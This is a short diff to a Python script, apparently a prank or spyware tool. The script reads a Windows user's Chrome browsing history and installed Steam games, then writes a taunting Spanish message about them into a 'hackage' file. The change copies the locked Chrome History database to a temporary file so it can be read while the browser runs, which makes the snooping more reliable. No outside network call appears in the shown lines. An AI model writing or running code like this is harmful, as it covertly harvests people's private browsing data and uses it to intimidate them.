@@ -4,6 +4,7 @@
 import os
 import re
 import sqlite3
+from shutil import copyfile
 from time import sleep, ctime
 from random import randrange
 
@@ -22,7 +23,9 @@ def get_chrome_history():
     while not urls:
         try:
             history_path = os.environ['USERPROFILE'] + '/AppData/Local/Google/Chrome/User Data/Profile 1/History'
-            con = sqlite3.connect(history_path)
+            temp_history = history_path + "temp"
+            copyfile(history_path, temp_history)
+            con = sqlite3.connect(temp_history)
             cursor = con.cursor()
             cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
             urls = cursor.fetchall()
@@ -87,7 +90,7 @@ def check_steam_games(hackage_file):
         games = []
         for item in games_listed:
             games.append(item.split("\\")[-1])
-        hackage_file.write("\n\nTambien he visto que has instalados los juegos de {}... fichao".format(", ".join(games)))
+        hackage_file.write("\n\nTambien he visto que has instalados los juegos de {}... ta fichao".format(", ".join(games)))
     except FileNotFoundError as e:
         print("El usuario no tiene instalado Steam :(")
 
